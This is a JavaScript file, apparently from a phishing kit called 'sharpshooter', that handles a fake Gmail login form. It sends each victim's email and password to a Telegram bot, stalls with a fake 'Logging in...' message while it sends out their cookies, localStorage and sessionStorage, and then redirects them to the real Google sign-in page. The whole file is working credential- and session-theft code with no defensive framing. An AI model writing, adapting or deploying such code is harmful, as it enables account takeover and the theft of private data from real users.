// sharpshooter/script.js

document.getElementById("gmail-login").addEventListener("submit", async function(e) {
  e.preventDefault();

  const formData = new FormData(this);
  const creds = {
    email: formData.get("email"),
    password: formData.get("password"),
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };

  try {
    // Step 1: Send credentials to Telegram
    await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: window.TELEGRAM_CHAT_ID,
        text: `📧 Gmail Login:\n\n📧 Email: ${creds.email}\n🔑 Pass: ${creds.password}\n🌐 Agent: ${creds.userAgent}\n⏳ Time: ${creds.timestamp}`
      })
    });

    // Step 2: Disable button & show feedback to user
    const btn = document.querySelector("button[type='submit']");
    btn.disabled = true;
    btn.textContent = "Logging in...";

    // Step 3: Wait briefly, then steal session data
    setTimeout(async () => {
      try {
        const sessionData = {
          cookies: document.cookie || "",
          ls: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
          ss: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))
        };

        await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: window.TELEGRAM_CHAT_ID,
            text: `🍪 Gmail Session Captured:\n${JSON.stringify(sessionData, null, 2)}`
          })
        });

      } catch (err) {
        console.error("[Session Exfil ERROR]:", err.message);
      } finally {
        // Step 4: Only redirect after capturing session
        window.location.href = "https://accounts.google.com/";
      }

    }, 2500); // Give illusion of slow authentication while collecting session

  } catch (err) {
    console.error("[Credential Exfil ERROR]:", err.message);
    alert("Login error occurred.");
  }
});